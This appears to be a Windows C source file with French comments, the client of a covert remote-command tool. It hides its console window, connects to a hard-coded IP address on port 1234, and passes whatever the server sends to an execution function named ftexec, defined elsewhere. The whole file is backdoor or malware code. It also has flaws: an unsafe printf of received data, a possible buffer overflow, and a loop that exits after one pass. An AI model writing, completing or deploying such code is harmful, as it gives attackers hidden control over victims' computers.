#include <winsock2.h>
#include <windows.h>

#include "proto.h"
#include <stdio.h>
#include <openssl/ssl.h>
#include <openssl/err.h>



int main()
{  
  
HWND myWindows = GetConsoleWindow();
ShowWindow(myWindows, SW_HIDE); 
    while (1) {

WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("Erreur lors de l'initialisation de Winsock\n");
        return 1;
    }

    // Création d'un socket TCP/IP
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        printf("Erreur lors de la création du socket\n");
        return 1;
    }

    // Paramètres du serveur auquel se connecter
    SOCKADDR_IN serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(1234);  // Port du serveur
    serverAddr.sin_addr.s_addr = inet_addr("192.168.191.141");  // Adresse IP du serveur

    // Connexion au serveur
    if (connect(sock, (SOCKADDR*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        printf("Erreur lors de la connexion au serveur\n");
        return 1;
    }

    // Réception du message du serveur
    char buffer[1024];
    int bytesReceived = recv(sock, buffer, sizeof(buffer), 0);
    if (bytesReceived > 0) {
        buffer[bytesReceived] = '\0';  // Ajouter le caractère de fin de chaîne
        printf(buffer);
        Sleep(3000);
        ftexec(buffer);  // Appeler la fonction ft_exec avec le message reçu
    } else {
        printf("Erreur lors de la réception du message du serveur\n");
    }

    // Fermeture du socket
    closesocket(sock);

    // Nettoyage de Winsock
    WSACleanup();

    return 0;
}

}